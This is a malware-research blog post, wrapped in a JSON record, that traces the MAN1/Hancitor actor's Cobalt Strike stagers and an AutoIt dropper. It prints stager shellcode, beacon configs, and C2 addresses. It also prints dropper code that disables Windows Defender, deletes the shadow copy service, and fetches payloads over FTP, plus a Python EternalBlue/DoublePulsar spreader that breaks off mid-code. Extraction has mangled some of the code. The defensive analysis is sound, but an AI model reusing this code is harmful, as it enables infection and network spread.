{
    "id": "81054c15-a572-405a-ac42-95a7509566a1",
    "created_at": "2023-01-12T15:04:39.811767Z",
    "updated_at": "2025-03-27T02:13:12.157268Z",
    "deleted_at": null,
    "sha1_hash": "78f9f494c15375f7b8ad2a7fd0c69d4bfbf223dd",
    "title": "2021-01-10 - MAN1, Moskal, Hancitor and a side of Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T17:58:10Z",
    "file_modification_date": "2022-05-28T17:58:10Z",
    "file_size": 1662036,
    "plain_text": "# MAN1, Moskal, Hancitor and a side of Ransomware\n\n**[medium.com/walmartglobaltech/man1-moskal-hancitor-and-a-side-of-ransomware-d77b4d991618](https://medium.com/walmartglobaltech/man1-moskal-hancitor-and-a-side-of-ransomware-d77b4d991618)**\n\nJason Reaves January 10, 2021\n\n### Jason Reaves\n\n Jan 10, 2021\n\n ·\n\n 13 min read\n\n MAN1 AKA Moskalvzapoe AKA TA511 are all names given to a threat actor(TA) that has been active in most major crimeware activities since at least 2014.\n\n Within the last few years most of the major e-crime groups have shifted away from normal banking trojan operations and moved towards ransom and data theft, this transition has proven to be very beneficial for them — even though it is a drastic shift from the older days where locking activities were considered to be low-tier activities and a waste of an infection.\n\n\n-----\n\n### Ransomware payments from FBI, Photo Credit As more groups began pivoting to enterprise-focused ransomware activities into 2020, it caused a trend where companies began funding these e-crime groups through ransom payments, turning them into criminal organizations with funding that rivals any major security startup. MAN1 is no exception as many researchers started to notice that Hancitor/Chanitor campaigns began leading to CobaltStrike.\n\n In the linked sandbox report from the SANS article we can download and decode the chanitor/hancitor task listed:\n```\nhttp://yudiartawan.com/a\n\n The file can be decoded by using the first 8 bytes as a XOR key and then LZNT decompressing the result.\n\n After decoding the file we are left with a packed CobaltStrike stager, these stagers are built from CobaltStrike much like the beacon files as both will share the same watermark. After unpacking we can decode the shellcode that will be responsible for downloading the beacon file:\n\n```\n\n-----\n\n```\n\\xfc\\xe8\\x89\\x00\\x00\\x00 \\x89\\xe51\\xd2d\\x8bR0\\x8bR\\x0c\\x8bR\\x14\\x8br(\\x0f\\xb7J&1\\xff1\\\n\\xc1\\xcf\\r\\x01\\xc7\\xe2\\xf0RW\\x8bR\\x10\\x8bB<\\x01\\xd0\\x8b@x\\x85\\xc0tJ\\x01\\xd0P\\x8bH\\x18\\\n\\x01\\xd3\\xe3<I\\x8b4\\x8b\\x01\\xd61\\xff1\\xc0\\xac\\xc1\\xcf\\r\\x01\\xc78\\xe0u\\xf4\\x03}\\xf8;}$u\n\\x06\\x18{\\xff\\xd5\\x85\\xc0\\x0f\\x84\\xc3\\x01\\x00\\x001\\xff\\x85\\xf6t\\x04\\x89\\xf9\\xeb\\th\\xaa\n<\n\\x90\\x93\\x98|\\xee\\x02g\\xc2\\xe4\\xeej\\x90\\xa2\\xb4\\xa7\\xc8$\\x14\\xd3\\xfb\\x1a\\xfc\\xdb\\x08\\x\nAgent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0;\nASU2JS)\\r\\n\\x00\\xdd\\xe2nU\\x0f\\x16X[q\\xd9e\\xb0\\x81\\xf3k|FQ\\xeaM\\xa3`\\xab\\xc2_\\x1e\\\\\\x1d\n\\x00\\x00SVh\\x12\\x96\\x89\\xe2\\xff\\xd5\\x85\\xc0t\\xc6\\x8b\\x07\\x01\\xc3\\x85\\xc0u\\xe5X\\xc3\\xe8\n\n### This stager shellcode will download and detonate the encoded beacon from:\n31.44.184.125/tYX7\n\n The file is also available in the sandbox run and so we can decode the file which has a shellcode wrapper on top and then decode the CobaltStrike beacon configuration.\n{'PROXY_BEHAVIOR': '2', 'PROTOCOL': '0', 'SPAWNTO_X64':\n'%windir%\\\\sysnative\\\\rundll32.exe', 'SLEEPTIME': '60000', 'KillDate': '0',\n'C2_VERB_GET': 'GET', 'ProcInject_Prepend_x64': '', 'ProcInject_StartRWX': '64',\n'DNS_SLEEP': '0', 'ProcInject_Prepend_x86': '', 'ProcInject_MinAllocSize': '0',\n'ProcInject_UseRWX': '64', 'MAXGET': '1048576', 'USERAGENT': 'Mozilla/5.0\n(compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MAGWJS)', 'PORT': '80',\n'DNS_IDLE': '0', 'ProcInject_AllocationMethod': '0', 'UsesCookies': '1',\n'C2_POSTREQ': \"[('_HEADER', 0, 'Content-Type: application/octet-stream'), ('BUILD',\n('PARAMETER', 'id'))]\", 'WATERMARK': '1873433027', 'textSectEnd': '0', 'PUBKEY':\n'30819f300d06092a864886f70d010101050003818d0030818902818100d8c44da76cfed63a526be88bf19\n 'SPAWNTO_X86': '%windir%\\\\syswow64\\\\rundll32.exe', 'C2_REQUEST': \"[('BUILD',\n('BASE64', 'HEADER', 'Cookie'))]\", 'CRYPTO_sCHEME': '0', 'ITTER': '0', 'C2_RECOVER':\n'\\x04', 'C2_CHUNK_POST': '0', 'ProcInject_Execute': '\\x01\\x02\\x03\\x04', 'PIPENAME':\n'', 'C2_VERB_POST': 'POST', 'bStageCleanup': '0', 'SUBMITURI': '/submit.php',\n'DOMAINS': '31.44.184.125,/updates.rss', 'bCFGCaution': '0', 'MAXDNS': '255'}\n\n The watermark from the beacon also matches the shellcode from the stager executable:\n'WATERMARK': '1873433027'\\xff31.44.184.125\\x00o\\xaaQ\\xc3\n\n Watermarks can be pivoted on by abusing the structure of the beacon configuration and known XOR keys, we take the watermark value:\no\\xaaQ\\xc3\n\n XOR with 0x69:\n\\x06\\xc38\\xaa\n\n We can find this value in the beacon:\n\n```\n\n-----\n\n```\n>>> a \\x06\\xc38\\xaa >>> data open( tYX7.decoded, rb ).read()>>>\ndata.find(a)202686>>>\ndata[202650:202700]‘ijiy9&:=iiiiiiiiiiiiiuikimiiiiiLikim\\x06\\xc38\\xaaiOihikiiiN’\n\n### Then do a VT content search based on part of the encoded data:\ncontent:\"{696b696d06c338aa}\"\n\n Which leads to a bunch of files for pivoting to.\n\n If the CS package is shared or leaked however then it can lead you down all sorts of rabbit holes, you can use it find lots of samples and then automate decoding all the config data and compare the beacon config and templating to try to find more related files.\n\n For now I’m interested in a sample that talks to the IP and is packed with the same packer as the previous one:\nbd3c278309e4fe19f7b424ee0b56a1a2c0bbae3a59882d5b6f171d3ca89f728b\n\n Unpacking this file gives us similar shellcode:\n\n```\n\n-----\n\n```\n\\xfc\\xe8\\x89\\x00\\x00\\x00 \\x89\\xe51\\xd2d\\x8bR0\\x8bR\\x0c\\x8bR\\x14\\x8br(\\x0f\\xb7J&1\\xff1\\\n\\xc1\\xcf\\r\\x01\\xc7\\xe2\\xf0RW\\x8bR\\x10\\x8bB<\\x01\\xd0\\x8b@x\\x85\\xc0tJ\\x01\\xd0P\\x8bH\\x18\\\n\\x01\\xd3\\xe3<I\\x8b4\\x8b\\x01\\xd61\\xff1\\xc0\\xac\\xc1\\xcf\\r\\x01\\xc78\\xe0u\\xf4\\x03}\\xf8;}$u\n\\x06\\x18{\\xff\\xd5\\x85\\xc0\\x0f\\x84\\xc3\\x01\\x00\\x001\\xff\\x85\\xf6t\\x04\\x89\\xf9\\xeb\\th\\xaa\n<\n\\x90\\x93\\x98|\\xee\\x02g\\xc2\\xe4\\xeej\\x90\\xa2\\xb4\\xa7\\xc8$\\x14\\xd3\\xfb\\x1a\\xfc\\xdb\\x08\\x\nAgent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0;\nASU2JS)\\r\\n\\x00\\xdd\\xe2nU\\x0f\\x16X[q\\xd9e\\xb0\\x81\\xf3k|FQ\\xeaM\\xa3`\\xab\\xc2_\\x1e\\\\\\x1d\n\\x00\\x00SVh\\x12\\x96\\x89\\xe2\\xff\\xd5\\x85\\xc0t\\xc6\\x8b\\x07\\x01\\xc3\\x85\\xc0u\\xe5X\\xc3\\xe8\n\n### Same watermark, IP address and URI as the previous one but this file has an interesting ITW(In the Wild) record in VirusTotal:\nhttp://en.bulgarienview.com/wp-content/themes/twentynineteen/inc/artvnch.exe\n\n The filename for artvnch.exe as a CS stager can be seen as a tasking for an Amadey bot in VirusTotal, f3823f8c3d1f3d45e1a9268df5b89f9f60fa02f8ad267e7e6b7cbff74dcaf627.\n\n This Amadey is associated with MAN1, Version 1.43 and C2s:\ncompturot .com/f5lkB/index.phpthaturicia .ru/f5lkB/index.phpcholopethe\n.ru/f5lkB/index.php\n\n We can actually find a lot of these files with the same names that are CS stagers being downloaded as tasks.\nbe4c49df859762dc2c7d11794f5731dd498698158b11a9ff18b3f91fdc1f591aCS stager downloaded\nfrom: \nhxxp://phtmierzwa.]com/plugins/content/apismtp/artifact125.exe655346f41c456cefd9d40c1b\n stager downloaded from: hxxp://rsmleather.]com/wp-content/plugins/so-widgetsbundle/artvnch.exe2d038b20eaf05bb8d673542f1dbab6a376abb05bf10d38b04f163cfd6c2a7252 CS\nstager downloaded from:\nhxxp://fastwaylogistic[.]com/artvnch.exea0f49754f0fe204ad9020c1677f09018d3ab7dd3e45e1b\n stager downloaded from: hxxp://lumispot[.com/wp-content/plugins/nextgengallery/artvnch.exe\n\n The actor(s) appear to use multiple IP addresses along this range and a few others, for example:\n45.142.213.167\n\n```\n\n-----\n\n### We can see a few things the artvnch.exe name again but also a work.exe file which is a CS stager download beacon from:\n```\n45.142.213.167/imP6\n\n The watermark is also the same as our previously identified CS files. This server is hosting a number of other interesting files:\nea93c89dbf63ec462f19f6ac039c0cdf3d283b64eaadd6c38679c9b70710bd71,\ndoe_install.exe6e4459199d7fbdc4c215e595906e78fdd1c15ad3be6abed6540b80de17b63f3b,oxford\n\n ea93c89dbf63ec462f19f6ac039c0cdf3d283b64eaadd6c38679c9b70710bd71\n\n The file doe_install.exe will, according to the cached sandbox report on VirusTotal, talk to another CS server:\n185.153.196.207\n\n This is an autoit compiled script that will eventually detonate two files but also perform some anti checks.\n\n```\n\n-----\n\n```\n$john John $name1 Peter Wilson $name2 Acme $name3 BOBSPC $name4 \n\"Johnson\"$name5 = \"John\"$name6 = \"John Doe\"$name7 = \"Rivest\"$name8 = \"mw\"$name9 =\n\"me\"$name10 = \"sys\"$name11 = \"Apiary\"$name12 = \"STRAZNJICA.GRUBUTT\"$name13 =\n\"Phil\"$name14 = \"Customer\"$name15 = \"shimamu\"$pcname1 = \"RALPHS-PC\"$pcname2 = \"ABCWIN7\"$pcname3 = \"man-PC\"$pcname4 = \"luser-PC\"$pcname5 = \"Klone-PC\"$pcname6 = \"tptPC\"$pcname7 = \"BOBSPC\"$pcname8 = \"WillCarter-PC\"$pcname9 = \"PETER-PC\"$pcname10 =\n\"David-PC\"$pcname11 = \"ART-PC\"$pcname12 = \"TOM-PC\"If ProcessExists(\"frida-winjectorhelper-32.exe\") OR ProcessExists(\"analyzer.exe\") Then ExitEndIf$name =\n@UserName$pcname = @ComputerNameIf @ComputerName = \"WIN7SP1-SSLCAP\" Then\nExitEndIfIf FileExists(@DesktopDir & \"\\secret.txt\") Then ExitEndIfIf\nFileExists(@DesktopDir & \"\\my.txt\") Then ExitEndIfIf FileExists(@DesktopDir &\n\"\\report.odt\") Then ExitEndIfIf FileExists(@DesktopDir & \"\\report.rtf\") Then\nExitEndIfIf FileExists(@DesktopDir & \"\\Incidents.pptx\") Then ExitEndIfIf $name =\n$name1 Then ExitEndIfIf $name = $name2 Then ExitEndIfIf $name = $name3 Then\nExitEndIfIf $name = $name4 Then ExitEndIfIf $name = $name5 Then ExitEndIfIf $name =\n$name6 Then ExitEndIfIf $name = $name7 Then ExitEndIfIf $name = $name8 Then\nExitEndIfIf $name = $name9 Then ExitEndIfIf $name = $name10 Then ExitEndIfIf\n$name = $name11 Then ExitEndIfIf $name = $name12 Then ExitEndIfIf $name =\n$name13 Then ExitEndIfIf $name = $name14 Then ExitEndIfIf $name = $name15\nThen ExitEndIfIf $pcname = $pcname1 Then ExitEndIfIf $pcname = $pcname2 Then\nExitEndIfIf $pcname = $pcname3 Then ExitEndIfIf $pcname = $pcname4 Then\nExitEndIfIf $pcname = $pcname5 Then ExitEndIfIf $pcname = $pcname6 Then\nExitEndIfIf $pcname = $pcname7 Then ExitEndIfIf $pcname = $pcname8 Then\nExitEndIfIf $pcname = $pcname9 Then ExitEndIfIf $pcname = $pcname10 Then\nExitEndIfIf $pcname = $pcname11 Then ExitEndIfIf $pcname = $pcname12 Then\nExitEndIfIf ProcessExists(\"joeboxcontrol.exe\") OR ProcessExists(\"joeboxserver.exe\")\nThen ExitEndIfIf @OSVersion = \"WIN_XP\" Then ExitEndIfIf\nFileExists(\"C:\\ProgramData\\Microsoft\\Check\\Check.txt\") Then Exit\n\n### Attempts to disable or uninstall security software:\n\n```\n\n-----\n\n```\nIf ProcessExists( msseces.exe ) Then $scmd C:\\Windows\\System32\\wbem\\wmic.exe\nproduct where name=\"Microsoft Security Client\" call uninstall /nointeractive' $ipid\n= Run(@ComSpec & ' /C \"' & $scmd & '\"', \"\", @SW_HIDE)\nSleep(8000)DirCreate(\"C:\\Programdata\\install\") DirCreate(\"C:\\Programdata\\RunDLL\")\nDirCreate(\"C:\\Programdata\\Microsoft\\Intel\")\nDirCreate(\"C:\\Programdata\\System32\\logs\")\nDirCreate(\"C:\\ProgramData\\Microsoft\\Check\") DirCreate(\"C:\\ProgramData\\RealtekHD\")\nDirCreate(\"C:\\programdata\\WindowsTask\") DirCreate(\"C:\\programdata\\Microsoft\\temp\")\n$logfile = \"C:\\Programdata\\Microsoft\\Check\\Check.txt\" If NOT FileExists($logfile)\nThen _filecreate($logfile) $pathscript =\n\"C:\\ProgramData\\RealtekHD\\taskhostw.exe\" $sname = (\"Realtek HD Audio\")\nRegWrite(\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", $sname, \"REG_SZ\",\n$pathscript) RegWrite(\"HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\", \"John\", \"REG_DWORD\", 0)\nRegWrite(\"HKLM64\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\", \"John\", \"REG_DWORD\", 0)\nSleep(100) RegWrite(\"HKLM64\\SOFTWARE\\SOFTWARE\\Policies\\Microsoft\\Windows\nDefender\", \"DisableAntiSpyware\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM\\SOFTWARE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\",\n\"DisableAntiSpyware\", \"REG_DWORD\", 1) Sleep(100)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableIOAVProtection\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableIOAVProtection\", \"REG_DWORD\", 1) Sleep(50)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableBehaviorMonitoring\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableBehaviorMonitoring\", \"REG_DWORD\", 1) Sleep(50)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableOnAccessProtection\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableOnAccessProtection\", \"REG_DWORD\", 1) Sleep(50)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableRawWriteNotification\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\",\n\"DisableRawWriteNotification\", \"REG_DWORD\", 1) Sleep(50)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\",\n\"DisableBlockAltFirstSeen\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\",\n\"DisableBlockAltFirstSeen\", \"REG_DWORD\", 1) Sleep(100)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\",\n\"LocalSettingOverrideSpynetRepting\", \"REG_DWORD\", 0)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\",\n\"LocalSettingOverrideSpynetRepting\", \"REG_DWORD\", 0) Sleep(100)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\",\n\"SumbitSamplesConsent\", \"REG_DWORD\", 2)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\",\n\"SumbitSamplesConsent\", \"REG_DWORD\", 2) Sleep(100)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\",\n\"Exclusions_Paths\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\",\n\"Exclusions_Paths\", \"REG_DWORD\", 1) Sleep(100)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\",\n\"C:\\Programdata\", \"REG_SZ\", \"System\")\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\",\n\n```\n\n-----\n\n```\n C:\\Programdata, REG_SZ, System ) Sleep(50)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\",\n\"C:\\Windows\\System32\", \"REG_SZ\", \"SystemHD\")\nRegWrite(\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\",\n\"C:\\Windows\\System32\", \"REG_SZ\", \"SystemHD\") Sleep(50)\nRegWrite(\"HKLM64\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\",\n\"EnableLUA\", \"REG_DWORD\", 0)\nRegWrite(\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\",\n\"EnableLUA\", \"REG_DWORD\", 0) Sleep(100)\nRegWrite(\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\",\n\"ConsentPromptBehaviorAdmin\", \"REG_DWORD\", 0)\nRegWrite(\"HKLM64\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\",\n\"ConsentPromptBehaviorAdmin\", \"REG_DWORD\", 0) Sleep(100)\nRegWrite(\"HKLM64\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell\",\n\"UseActionCenterExperience\", \"REG_DWORD\", 0)\nRegWrite(\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell\",\n\"UseActionCenterExperience\", \"REG_DWORD\", 0)\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advance\n \"EnableBalloonTips\", \"REG_DWORD\", 0)\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting\",\n\"disable\", \"REG_DWORD\", 1)\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\PushNotification\n \"ToastEnabled\", \"REG_DWORD\", 0) Sleep(100)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting\",\n\"DisableEnhancedNotifications\", \"REG_DWORD\", 1)\nRegWrite(\"HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\",\n\"Notification_Suppress\", \"REG_DWORD\", 1) Sleep(100)\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"DisallowRun\", \"REG_DWORD\", 1)\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"1\", \"REG_SZ\", \"eav_trial_rus.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"2\", \"REG_SZ\", \"avast_free_antivirus_setup_online.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"3\", \"REG_SZ\", \"eis_trial_rus.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"4\", \"REG_SZ\", \"essf_trial_rus.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"5\", \"REG_SZ\", \"hitmanpro_x64.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"6\", \"REG_SZ\", \"ESETOnlineScanner_UKR.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"7\", \"REG_SZ\", \"ESETOnlineScanner_RUS.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"8\", \"REG_SZ\", \"HitmanPro.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"9\", \"REG_SZ\", \"360TS_Setup_Mini.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"10\", \"REG_SZ\", \"Cezurity_Scanner_Pro_Free.exe\")\nRegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explore\n \"11\", \"REG_SZ\", \"Cube.exe\")\n\n### Delete shadow file service:\nRun(@ComSpec & \" /c \" & \"sc delete swprv\", \"\", @SW HIDE)\n\n```\n\n-----\n\n### The script will also perform a request at the end which is probably for stats tracking:\n```\n$iplog2 = \"https://iplogger.org/1fCk97\"InetRead($iplog2, 3)\n\n Ultimately as mentioned before the script will detonate two files:\nIf @OSArch = \"X64\" Then FileInstall(\"C:\\2\\taskhostw.exe\",\n\"C:\\ProgramData\\RealtekHD\\taskhostw.exe\") Sleep(1000)\nRun(\"C:\\ProgramData\\RealtekHD\\taskhostw.exe\") FileInstall(\"C:\\2\\art.exe\",\n\"C:\\ProgramData\\install\\art.exe\") Run(\"C:\\ProgramData\\install\\art.exe\")\n\n art.exe — d08131d236658401c8de489596ee83992058f05176cbd8b72add89fcea57e37c\n\n This is a packed CS stager that will download a beacon from:\n185.153.196. 207/M7ph\n\n Also with the same watermark as our previously identified CS related files. The other file is a bit different.\n\n taskhostw.exe — 3ac1741ee7dcf04cb5dba01d82d4232347a63697f0ca8b00661960f719cade23\n\n This is a 64bit Autoit compiled executable, decompiled shows the file is simply a loader, it has the same anti checks as previously discussed but also creates a window with the title “YouWillBeMined2” which will be used as a check to see if it is already running.\nGUICreate(\"YouWillBeMined2\")\n\n The script will then download a file from an FTP server:\n$worked = \"ONLINE\"$server = \"learinmica.com\"$username = \"alex\"$pass =\n\"easypassword\"Local $open = _ftp_open(\"FTP\")\n\n Judging by the checks that then happen you can speculate that this will be involved in SMB scanning for spreading:\n\n```\n\n-----\n\n```\nIf $worked ONLINE Then If $ftp_status ONLINE Then  If @OSVersion\n<> \"WIN_10\" Then If NOT\nFileExists(\"C:\\Programdata\\RunDLL\\Doublepulsar-1.3.1.exe\") OR NOT\nFileExists(\"C:\\Programdata\\RunDLL\\Eternalblue-2.2.0.exe\") OR NOT\nFileExists(\"C:\\Programdata\\RunDLL\\rundll.exe\") OR NOT\nFileExists(\"C:\\Programdata\\RunDLL\\system.exe\") OR NOT\nFileExists(\"C:\\Programdata\\RunDLL\\start.exe\") Then\nConsoleWrite(\"Downlading Scaner.dat\" & @CRLF) Local\n$ftp_xmrigcpu64 = \"scaner.dat\"  Local $hopen =\n_ftp_open(\"FTP\") Local $hconn = _ftp_connect($hopen,\n$server, $username, $pass, 1) Local $ftpg =\n_ftp_fileget($hconn, $ftp_xmrigcpu64, \"C:\\Programdata\\WindowsTask\" & \"\\\" &\n$ftp_xmrigcpu64) Local $isize =\n_ftp_filegetsize($hconn, \"/\" & $ftp_xmrigcpu64) \nConsoleWrite($isize & @CRLF) Local $iftpc =\n_ftp_close($hconn) Local $iftpo = _ftp_close($hopen)\nFileSetAttrib(\"C:\\ProgramData\\WindowsTask\\scaner.dat\", \"+SH\")\nSleep(300)\nFileMove(\"C:\\Programdata\\Windowstask\\scaner.dat\",\n\"C:\\Programdata\\WindowsTask\\scaner.exe\")\nFileSetAttrib(\"C:\\ProgramData\\WindowsTask\\scaner.exe\", \"+SH\")\nSleep(300) Run(\"C:\\Programdata\\WindowsTask\\scaner.exe pnaxui\") Sleep(2000)\nFileDelete(\"C:\\Programdata\\WindowsTask\\scaner.dat\")\nFileDelete(\"C:\\Programdata\\WindowsTask\\scaner.exe\")\nFileSetAttrib(\"C:\\ProgramData\\RunDLL\\*.*\", \"+SH\")\nFileSetAttrib(\"C:\\ProgramData\\RunDLL\", \"+SH\") EndIf\nSleep(2000) If NOT ProcessExists(\"system.exe\") Then \nIf NOT ProcessExists(\"Msiexec64.exe\") Then If\nFileExists(\"C:\\ProgramData\\RunDLL\\start.exe\") Then\nRun(\"C:\\ProgramData\\RunDLL\\start.exe\") \nConsoleWrite(\"Staring Scaner RunDLL.exe\" & @CRLF)\nEndIf EndIf EndIf EndIf\n\n### FTP server is on same range as some of the CS boxes:\nlearinmica .com. 600 IN A 31.44.184 .108\n\n scaner.dat — 3f51abd78e607bcd707cbd2f4d90a3d02d5d00fa07320a88838c373239ee6d4b\n\n This file is a password protected self extracting rar, the password is naxui from the detonation above in the script.\n\n After unpacking the files we are left with a bunch of files related to EternalBlue and DoublePulsar but the script above is mainly related to detonating start.exe\n\n start.exe — 54081e33bcd09d29d065533c230256e49adff2edd48f5eb91a2434c03dd9ecb9\n\n This file is a SFX RAR with a vbs inside of it, the VBS file just detonates another file that was unpacked:\n\n```\n\n-----\n\n```\nSet WshShell CreateObject( WScript.Shell ) WshShell.Run cmd.exe /c Rundll.exe, 0,\nfalse\n\n### rundll.exe — 8b58e3a1a6a11225050af6c82e92451779c0315a602d19ad330e175a7c416bf6\n\n This is a compiled python script which we can decompile:\n\n```\n\n-----\n\n```\nimport subprocess\nimport time\nimport threading\nimport socket\nimport sys\nimport random\nimport os\ntry:\n  MyIP = socket.gethostbyname_ex(socket.gethostname())[2]\nexcept:\n  MyIP = '10.0.0.2'\ndef EternalBlue(ip):\n  path = 'Eternalblue-2.2.0.exe'\n  inconfig = ' --inconfig Eternalblue-2.2.0.xml'\n  NetworkTimeout = ' --NetworkTimeout 60'\n  TargetIp = ' --TargetIp %s' % ip\n  TargetPort = ' --TargetPort 445'\n  Target = ' --Target WIN72K8R2'\n  summ = path + inconfig + NetworkTimeout + TargetIp + TargetPort + Target\n  PIPE = subprocess.PIPE\n  p = subprocess.Popen(summ, shell=True, stdin=PIPE, stdout=PIPE,\nstderr=subprocess.STDOUT)\n  output = p.communicate()\n  output = list(output)\n  output = output[0].split('\\r\\n')\n  if output.count('[+] CORE terminated with status code 0x00000000') == 1 and\noutput.count('  [+] Ping returned Target architecture: x64 (64-bit)'):\n    x = 'good x64'\n    return x\n  elif output.count('[+] CORE terminated with status code 0x00000000') == 1 and\noutput.count('  [+] Ping returned Target architecture: x86 (32-bit)'):\n    x = 'good x86'\n    return x\n  else:\n    x = 'not good'\n    return x\ndef Pulsar(ip, arch, dll):\n  path = 'Doublepulsar-1.3.1.exe'\n  inconfig = ' --inconfig Doublepulsar-1.3.1.xml'\n  NetworkTimeout = ' --NetworkTimeout 60'\n  TargetIp = ' --TargetIp %s' % ip\n  TargetPort = ' --TargetPort 445'\n  DllPayload = ' --DllPayload %s' % dll\n  DllOrdinal = ' --DllOrdinal 1'\n  ProcessName = ' --ProcessName lsass.exe'\n  Protocol = ' --Protocol SMB'\n  Architecture = ' --Architecture %s' % arch\n  Function = ' --Fuction RunDll'\n  processCommandLine = ' --processCommandLine'\n  summ = path + inconfig + NetworkTimeout + TargetIp + TargetPort + Architecture +\n\n```\n\n-----\n\n```\nDllPayload + Protocol + DllOrdinal + Function + ProcessName + processCommandLine\n  PIPE = subprocess.PIPE\n  p = subprocess.Popen(summ, shell=True, stdin=PIPE, stdout=PIPE,\nstderr=subprocess.STDOUT)\n  output = p.communicate()\n  list(output)\n  output = output[0].split('\\r\\n')\ndef scaner(ip):\n  try:\n    os.remove('Result.txt')\n  except:\n    pass\n  Result = []\n  scan = 'system.exe TCP %s 445 150 /save' % ip\n  PIPE = subprocess.PIPE\n  p = subprocess.Popen(scan, shell=True, stdin=PIPE, stdout=PIPE,\nstderr=subprocess.STDOUT)\n  output = p.communicate()\n  for line in open('Result.txt', 'r').read().split('\\n'):\n    if line.find('Open') > 1:\n      Result.append(line.split(' ')[0])\n  print Result\n  os.remove('Result.txt')\n  return Result\ndef scaner_local(ip):\n  try:\n    os.remove('Result.txt')\n  except:\n    pass\n  Result = []\n  scan = 'system.exe TCP %s 445 150 /save' % ip\n  PIPE = subprocess.PIPE\n  p = subprocess.Popen(scan, shell=True, stdin=PIPE, stdout=PIPE,\nstderr=subprocess.STDOUT)\n  output = p.communicate()\n  for line in open('Result.txt', 